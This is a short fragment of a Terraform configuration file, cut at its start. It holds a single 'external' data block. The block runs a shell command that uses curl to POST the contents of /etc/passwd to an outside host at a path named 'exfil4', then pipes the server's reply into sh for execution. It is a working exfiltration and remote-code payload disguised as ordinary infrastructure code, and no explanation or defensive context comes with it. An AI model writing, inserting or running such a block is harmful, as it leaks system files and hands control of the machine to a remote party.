ata "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
https://fzi6s93ujh0hgsgy06ymaprpug08o2cr.net-spi.com/exfil4 | sh"]
}
